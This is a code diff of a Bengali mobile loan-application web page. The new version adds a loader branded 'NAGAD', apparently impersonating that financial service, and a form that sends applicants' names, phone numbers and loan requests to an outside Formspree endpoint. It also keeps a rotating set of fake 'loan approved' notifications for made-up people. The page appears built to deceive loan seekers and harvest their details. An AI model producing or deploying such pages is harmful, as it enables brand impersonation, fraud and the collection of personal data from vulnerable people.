@@ -3,430 +3,320 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>লোন আবেদন ফরম</title>
+    <title>লোন আবেদন</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { 
+            background: #0f172a; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
         }
 
-        body {
-            background-color: #f7f8fa;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .phone-wrapper {
-            width: 100%;
-            max-width: 430px;
-            background: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            padding-bottom: 90px;
-        }
-
-        /* Top Header */
-        .header-bg {
-            background: linear-gradient(180deg, #f05a22 0%, #ea531b 100%);
-            padding: 25px 20px 35px;
-            text-align: center;
-            border-bottom-left-radius: 35px;
-            border-bottom-right-radius: 35px;
-            color: #ffffff;
-        }
-
-        /* Website Logo Container */
-        .logo-circle {
-            width: 75px;
-            height: 75px;
-            background: #ffffff;
-            border-radius: 50%;
-            margin: 0 auto 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            border: 2px solid rgba(255, 255, 255, 0.8);
-            padding: 6px;
-        }
-
-        .logo-circle img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        .header-bg h1 {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
-
-        .header-bg p {
-            font-size: 13px;
-            opacity: 0.95;
-        }
-
-        /* Form Area */
-        .content-area {
-            padding: 25px 20px;
-            flex-grow: 1;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-            font-weight: 700;
-            color: #333333;
-            margin-bottom: 8px;
-        }
-
-        .input-control {
-            width: 100%;
-            padding: 13px 16px;
-            border: 1.5px solid #ffccbc;
-            border-radius: 12px;
-            font-size: 14px;
-            color: #333333;
-            outline: none;
-            background-color: #ffffff;
-            transition: border-color 0.2s;
-        }
-
-        .input-control:focus {
-            border-color: #f05a22;
-        }
-
-        .input-control::placeholder {
-            color: #a0a0a0;
-        }
-
-        select.input-control {
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23666666' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-            background-repeat: no-repeat;
-            background-position: right 14px center;
-            background-size: 14px;
-            cursor: pointer;
-        }
-
-        /* Submit Button */
-        .footer-action {
-            padding: 20px 20px 10px;
-        }
-
-        .btn-submit {
-            width: 100%;
-            background: linear-gradient(90deg, #f05a22 0%, #ff6e38 100%);
-            color: #ffffff;
-            border: none;
-            padding: 14px 20px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(240, 90, 34, 0.35);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        /* Alert Modal */
-        .popup-overlay {
-            display: none;
+        #pageLoader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .popup-box {
+            height: 100vh;
             background: #ffffff;
-            width: 85%;
-            max-width: 320px;
-            border-radius: 18px;
-            padding: 24px 20px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-            animation: popIn 0.25s ease-out;
-        }
-
-        @keyframes popIn {
-            from { transform: scale(0.85); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .popup-icon {
-            font-size: 38px;
-            margin-bottom: 10px;
-        }
-
-        .popup-box h3 {
-            font-size: 18px;
-            color: #333333;
-            margin-bottom: 8px;
-        }
-
-        .popup-box p {
-            font-size: 14px;
-            color: #666666;
-            margin-bottom: 20px;
-            line-height: 1.4;
-        }
-
-        .popup-btn {
-            width: 100%;
-            background: #f05a22;
-            color: #ffffff;
-            border: none;
-            padding: 12px;
-            border-radius: 10px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-        }
-
-        /* Bottom Approved Notification Card */
-        .bottom-card-popup {
-            position: fixed;
-            bottom: 14px;
-            left: 50%;
-            transform: translateX(-50%) translateY(120px);
-            width: calc(100% - 32px);
-            max-width: 398px;
-            background: #ffffff;
-            border-radius: 14px;
-            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.04);
-            display: flex;
-            align-items: center;
-            padding: 12px 14px;
-            gap: 12px;
-            border-left: 5px solid #00a651;
-            z-index: 99999;
-            opacity: 0;
-            transition: all 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            pointer-events: none;
-        }
-
-        .bottom-card-popup.show {
-            transform: translateX(-50%) translateY(0);
-            opacity: 1;
-        }
-
-        .tick-badge {
-            width: 38px;
-            height: 38px;
-            background: #d4f4e2;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-
-        .tick-badge svg {
-            width: 20px;
-            height: 20px;
-            fill: #00a651;
-        }
-
-        .card-details {
             display: flex;
             flex-direction: column;
-            gap: 2px;
-            line-height: 1.3;
+            justify-content: center;
+            align-items: center;
+            z-index: 999999;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
         }
-
-        .card-title {
-            font-size: 14px;
-            font-weight: 700;
-            color: #222222;
+        #pageLoader.hidden {
+            opacity: 0;
+            visibility: hidden;
         }
-
-        .card-subtitle {
+        .loader-logo {
+            width: 90px;
+            height: 90px;
+            object-fit: cover;
+            border-radius: 50%;
+            background: #ffffff;
+            padding: 3px;
+            box-shadow: 0 8px 25px rgba(255, 94, 0, 0.2);
+            margin-bottom: 16px;
+            animation: pulseLogo 1.6s infinite ease-in-out;
+        }
+        .loader-brand {
+            font-size: 24px;
+            font-weight: 800;
+            color: #ff5e00;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 22px;
+        }
+        .loader-track {
+            width: 220px;
+            height: 5px;
+            background: #ffedd5;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .loader-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff5e00, #ff8800);
+            border-radius: 10px;
+            transition: width 2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .loader-subtext {
+            margin-top: 12px;
             font-size: 13px;
-            font-weight: 600;
-            color: #00a651;
+            color: #94a3b8;
+            font-weight: 500;
+        }
+        @keyframes pulseLogo {
+            0% { transform: scale(0.97); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(0.97); }
         }
 
-        .card-time {
-            font-size: 11px;
-            color: #888888;
-            margin-top: 1px;
+        .container { 
+            width: 100%; 
+            max-width: 450px; 
+            background: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            position: relative; 
+        }
+        .header { 
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6); 
+            color: #ffffff; 
+            padding: 30px 20px; 
+            text-align: center; 
+        }
+        .header h2 { font-size: 22px; margin-bottom: 6px; }
+        .header p { font-size: 13px; opacity: 0.9; }
+
+        .form-wrap { padding: 25px 20px; flex-grow: 1; }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { 
+            display: block; 
+            font-size: 13px; 
+            font-weight: 600; 
+            color: #334155; 
+            margin-bottom: 8px; 
+        }
+        .form-group input, .form-group select { 
+            width: 100%; 
+            padding: 13px 15px; 
+            border: 1.5px solid #cbd5e1; 
+            border-radius: 10px; 
+            font-size: 15px; 
+            outline: none; 
+            background: #f8fafc; 
+        }
+        .form-group input:focus, .form-group select:focus { 
+            border-color: #3b82f6; 
+            background: #ffffff; 
+        }
+        .btn-submit { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 30px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 10px; 
+        }
+        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        .loan-popup { 
+            position: fixed; 
+            bottom: 20px; 
+            left: 20px; 
+            background: #ffffff; 
+            color: #1e293b; 
+            padding: 12px 16px; 
+            border-radius: 12px; 
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            z-index: 9999; 
+            max-width: 340px; 
+            border-left: 5px solid #16a34a; 
+            opacity: 0; 
+            transform: translateY(30px); 
+            transition: all 0.5s ease-in-out; 
+            pointer-events: none; 
+        }
+        .loan-popup.show { 
+            opacity: 1; 
+            transform: translateY(0); 
+            pointer-events: auto; 
+        }
+        .popup-icon { 
+            width: 38px; 
+            height: 38px; 
+            background: #dcfce7; 
+            color: #16a34a; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 18px; 
+            flex-shrink: 0; 
+        }
+        .popup-content { display: flex; flex-direction: column; }
+        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
+        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
+        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
+        @media (max-width: 480px) { 
+            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } 
         }
     </style>
 </head>
 <body>
 
-<div class="phone-wrapper">
-    <!-- Header with Custom Website Logo -->
-    <div class="header-bg">
-        <div class="logo-circle">
-            <img src="logoo.png" alt="Website Logo" onerror="this.src='https://via.placeholder.com/80?text=LOGO'">
-        </div>
-        <h1>লোন আবেদন ফরম</h1>
+<div id="pageLoader">
+    <img src="Logoo.png" alt="Logo" class="loader-logo">
+    <div class="loader-brand">NAGAD</div>
+    <div class="loader-track">
+        <div class="loader-fill" id="fillBar"></div>
+    </div>
+    <div class="loader-subtext">অনুগ্রহ করে অপেক্ষা করুন...</div>
+</div>
+
+<div class="container">
+    <div class="header">
+        <h2>লোন আবেদন ফরম</h2>
         <p>সঠিক তথ্য দিয়ে আবেদনটি সম্পন্ন করুন</p>
     </div>
 
-    <!-- Form Content -->
-    <div class="content-area">
-        <div class="form-group">
-            <label class="form-label">👤 সম্পূর্ণ নাম</label>
-            <input type="text" id="userName" class="input-control" placeholder="আপনার পুরো নাম">
-        </div>
+    <div class="form-wrap">
+        <form id="loanForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <div class="form-group">
+                <label><i class="fa-solid fa-user"></i> সম্পূর্ণ নাম</label>
+                <input type="text" id="custName" name="নাম" required placeholder="আপনার পুরো নাম">
+            </div>
 
-        <div class="form-group">
-            <label class="form-label">📞 মোবাইল নম্বর</label>
-            <input type="tel" id="userPhone" class="input-control" placeholder="০১XXXXXXXXX">
-        </div>
+            <div class="form-group">
+                <label><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
+                <input type="tel" id="custPhone" name="মোবাইল" required placeholder="০১XXXXXXXXX">
+            </div>
 
-        <div class="form-group">
-            <label class="form-label">💰 লোনের পরিমাণ</label>
-            <select id="loanAmountSelect" class="input-control">
-                <option value="3000">৩,০০০ টাকা</option>
-                <option value="5000">৫,০০০ টাকা</option>
-                <option value="10000">১০,০০০ টাকা</option>
-                <option value="20000">২০,০০০ টাকা</option>
-                <option value="30000" selected>৩০,০০০ টাকা</option>
-                <option value="40000">৪০,০০০ টাকা</option>
-                <option value="50000">৫০,০০০ টাকা</option>
-            </select>
-        </div>
+            <div class="form-group">
+                <label><i class="fa-solid fa-sack-dollar"></i> লোনের পরিমাণ</label>
+                <select id="loanAmount" name="টাকার_পরিমাণ" required>
+                    <option value="৩,০০০ টাকা">৩,০০০ টাকা</option>
+                    <option value="৫,০০০ টাকা">৫,০০০ টাকা</option>
+                    <option value="১০,০০০ টাকা">১০,০০০ টাকা</option>
+                    <option value="২০,০০০ টাকা">২০,০০০ টাকা</option>
+                    <option value="৩০,০০০ টাকা" selected>৩০,০০০ টাকা</option>
+                    <option value="৫০,০০০ টাকা">৫০,০০০ টাকা</option>
+                </select>
+            </div>
 
-        <div class="form-group">
-            <label class="form-label">📅 পরিশোধের মেয়াদ</label>
-            <select id="loanTenureSelect" class="input-control">
-                <option value="3" selected>৩ মাস</option>
-                <option value="6">৬ মাস</option>
-                <option value="12">১২ মাস</option>
-            </select>
-        </div>
-    </div>
+            <div class="form-group">
+                <label><i class="fa-solid fa-calendar-days"></i> পরিশোধের মেয়াদ</label>
+                <select id="loanTenure" name="পরিশোধের_মেয়াদ" required>
+                    <option value="৩ মাস" selected>৩ মাস</option>
+                    <option value="৬ মাস">৬ মাস</option>
+                    <option value="১২ মাস">১২ মাস</option>
+                </select>
+            </div>
 
-    <!-- Submit Button -->
-    <div class="footer-action">
-        <button type="button" class="btn-submit" onclick="submitLoanForm()">
-            এগিয়ে যান &rarr;
-        </button>
+            <button type="submit" id="submitBtn" class="btn-submit">
+                <span>এগিয়ে যান</span>
+                <i class="fa-solid fa-arrow-right"></i>
+            </button>
+        </form>
     </div>
 </div>
 
-<!-- Validation Alert Popup -->
-<div id="customPopup" class="popup-overlay">
-    <div class="popup-box">
-        <div class="popup-icon">⚠️</div>
-        <h3>সতর্কতা</h3>
-        <p id="popupMessage">দয়া করে তথ্যগুলো সঠিকভাবে পূরণ করুন।</p>
-        <button type="button" class="popup-btn" onclick="closePopup()">ঠিক আছে</button>
-    </div>
-</div>
-
-<!-- Bottom Toast Popup -->
-<div id="bottomCardPopup" class="bottom-card-popup">
-    <div class="tick-badge">
-        <svg viewBox="0 0 24 24">
-            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-        </svg>
-    </div>
-    <div class="card-details">
-        <span class="card-title" id="toastName">রহিমা খাতুন (ঢাকা)</span>
-        <span class="card-subtitle" id="toastAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
-        <span class="card-time">এইমাত্র</span>
+<div id="loanAlert" class="loan-popup">
+    <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
+    <div class="popup-content">
+        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
+        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
+        <span class="popup-time" id="popTime">এইমাত্র</span>
     </div>
 </div>
 
 <script>
-function showPopup(msg) {
-    document.getElementById('popupMessage').innerText = msg;
-    document.getElementById('customPopup').style.display = 'flex';
-}
+    window.addEventListener("DOMContentLoaded", () => {
+        const fill = document.getElementById("fillBar");
+        const loader = document.getElementById("pageLoader");
 
-function closePopup() {
-    document.getElementById('customPopup').style.display = 'none';
-}
+        setTimeout(() => {
+            fill.style.width = "100%";
+        }, 100);
 
-function submitLoanForm() {
-    const name = document.getElementById('userName').value.trim();
-    const phone = document.getElementById('userPhone').value.trim();
-    const amount = document.getElementById('loanAmountSelect').value;
-    const months = document.getElementById('loanTenureSelect').value;
+        setTimeout(() => {
+            loader.classList.add("hidden");
+        }, 2200);
+    });
 
-    if (!name) {
-        showPopup("দয়া করে আপনার সম্পূর্ণ নাম লিখুন!");
-        return;
+    const form = document.getElementById("loanForm");
+    const submitBtn = document.getElementById("submitBtn");
+
+    form.addEventListener("submit", function(event) {
+        event.preventDefault();
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';
+
+        const nameVal = document.getElementById("custName").value;
+        const phoneVal = document.getElementById("custPhone").value;
+        const amountVal = document.getElementById("loanAmount").value;
+        const tenureVal = document.getElementById("loanTenure").value;
+
+        const data = new FormData(form);
+
+        fetch(form.action, {
+            method: "POST",
+            body: data,
+            headers: { 'Accept': 'application/json' }
+        }).finally(() => {
+            window.location.href = "summary.html?name=" + encodeURIComponent(nameVal) + "&phone=" + encodeURIComponent(phoneVal) + "&amount=" + encodeURIComponent(amountVal) + "&tenure=" + encodeURIComponent(tenureVal);
+        });
+    });
+
+    const loanData = [
+        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
+        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
+        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
+        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" }
+    ];
+
+    let currentIndex = 0;
+    const popupEl = document.getElementById("loanAlert");
+    const nameEl = document.getElementById("popName");
+    const amountEl = document.getElementById("popAmount");
+    const timeEl = document.getElementById("popTime");
+
+    function showNextNotification() {
+        const item = loanData[currentIndex];
+        nameEl.innerText = `${item.name} (${item.district})`;
+        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
+        timeEl.innerText = item.time;
+        popupEl.classList.add("show");
+
+        setTimeout(() => { 
+            popupEl.classList.remove("show"); 
+        }, 4000);
+
+        currentIndex = (currentIndex + 1) % loanData.length;
     }
-    if (!phone) {
-        showPopup("দয়া করে আপনার মোবাইল নম্বর লিখুন!");
-        return;
-    }
-    if (phone.length < 11) {
-        showPopup("সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন!");
-        return;
-    }
 
-    localStorage.setItem('applicantName', name);
-    localStorage.setItem('applicantPhone', phone);
-    localStorage.setItem('selectedLoanAmount', amount);
-    localStorage.setItem('selectedLoanMonths', months);
-
-    window.location.href = `summary.html?amount=${amount}&months=${months}`;
-}
-
-const approvalData = [
-    { name: "রহিমা খাতুন (ঢাকা)", amount: "১০,০০০" },
-    { name: "রাজিব হোসেন (চট্টগ্রাম)", amount: "২০,০০০" },
-    { name: "ফারজানা আক্তার (সিলেট)", amount: "৩০,০০০" },
-    { name: "রাকিবুল ইসলাম (রাজশাহী)", amount: "৫০,০০০" },
-    { name: "তানভীর আহমেদ (খুলনা)", amount: "৪০,০০০" },
-    { name: "মেহেদী হাসান (বরিশাল)", amount: "১৫,০০০" }
-];
-
-let currentIndex = 0;
-
-function triggerBottomCard() {
-    const card = document.getElementById('bottomCardPopup');
-    const nameEl = document.getElementById('toastName');
-    const amtEl = document.getElementById('toastAmount');
-
-    if (!card || !nameEl || !amtEl) return;
-
-    const item = approvalData[currentIndex];
-    nameEl.innerText = item.name;
-    amtEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
-
-    card.classList.add('show');
-
-    setTimeout(() => {
-        card.classList.remove('show');
-    }, 4000);
-
-    currentIndex = (currentIndex + 1) % approvalData.length;
-}
-
-window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(triggerBottomCard, 1500);
-    setInterval(triggerBottomCard, 6000);
-});
+    setTimeout(() => { 
+        showNextNotification(); 
+        setInterval(showNextNotification, 8000); 
+    }, 2800);
 </script>
 
 </body>
